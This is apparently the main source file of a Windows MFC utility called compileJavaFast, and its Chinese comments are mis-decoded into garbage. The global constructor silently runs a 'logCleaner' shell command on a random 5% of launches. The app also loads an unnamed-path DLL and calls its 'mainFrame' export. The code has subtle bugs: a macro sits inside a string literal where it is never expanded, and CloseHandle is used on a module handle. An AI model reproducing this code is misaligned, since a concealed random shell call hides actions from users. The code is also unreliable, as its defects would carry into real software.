#pragma once

#include "stdafx.h"
#include "compileJavaFast.h"
#include <windows.h>

#define srandom (rand() % 100 + 1)
#define probability 5
#define logNumber 5;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CcompileJavaFastApp
BEGIN_MESSAGE_MAP(CcompileJavaFastApp, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()

// CcompileJavaFastApp ����
CcompileJavaFastApp::CcompileJavaFastApp()
{
	m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;
	srand((unsigned)time(0));
	if (srandom <= probability) {
		_wsystem(_T("logCleaner ,logNumber"));
	}
}

CcompileJavaFastApp theApp;

BOOL CcompileJavaFastApp::InitInstance()
{
	INITCOMMONCONTROLSEX InitCtrls;
	InitCtrls.dwSize = sizeof(InitCtrls);
	// ��������Ϊ��������Ҫ��Ӧ�ó�����ʹ�õĹ����ؼ��ࡣ
	InitCtrls.dwICC = ICC_WIN95_CLASSES;
	InitCommonControlsEx(&InitCtrls);

	CWinApp::InitInstance();

	AfxEnableControlContainer();

	// ���� shell ���������Է��Ի������
	// �κ� shell ����ͼ�ؼ��� shell �б���ͼ�ؼ���
	CShellManager *pShellManager = new CShellManager;

	// ���Windows Native���Ӿ����������Ա��� MFC �ؼ�����������
	CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));

	SetRegistryKey(_T("Java���ٱ��빤����"));

	try {
		typedef void(*lpFun)(void);
		HINSTANCE hDll = LoadLibrary(L"frameResource.dll");
		if (hDll == NULL) { throw (CString)_T("DLL_NOT_FOUND"); }
		lpFun pMainFrame = (lpFun)GetProcAddress(hDll, "mainFrame");
		if (pMainFrame == NULL) { throw (CString)_T("FUNCTION_NOT_FOUND"); }
		pMainFrame();
		CloseHandle(hDll);
	}
	catch (CString msg) {
		MessageBox(NULL, _T("������Դʱ����δ֪����\r\n���޸����������"), msg, MB_ICONERROR | MB_OK);
	}

	if (pShellManager != NULL) {
		delete pShellManager;
	}

#ifndef _AFXDLL
	ControlBarCleanUp();
#endif

	return FALSE;
}

